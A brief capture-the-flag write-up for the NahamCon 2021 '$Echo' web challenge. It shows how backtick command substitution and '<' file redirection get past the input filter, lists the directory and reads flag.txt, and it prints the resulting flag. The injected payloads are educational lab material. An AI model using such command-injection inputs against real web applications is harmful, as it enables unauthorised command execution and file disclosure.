---
description: $Echo Nahamcon 2021 challenge write up.
---

# $Echo

The page looks like is passing our input to the `echo` command filtering some kind of characters. Looks like it wont parse \` so we can execute, for example, the `ls` command putting \`ls\`. Also we can use `<` so we can tell bash to pass a file content to `echo`.

Putting \`ls ../\` return `flag.txt html` as output, so there is the flag. Lets try this:
```
`<../flag.txt`
```
And we get the flag:

```
flag{1beadaf44586ea4aba2ea9a00c5b6d91}
```
